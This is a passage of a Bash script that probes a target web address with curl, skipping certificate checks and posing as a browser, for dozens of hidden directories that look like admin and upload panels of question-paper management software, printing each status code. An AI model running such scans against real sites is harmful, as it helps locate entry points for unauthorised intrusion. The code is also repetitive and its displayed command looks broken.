payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PanelTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPUploader/"]: "
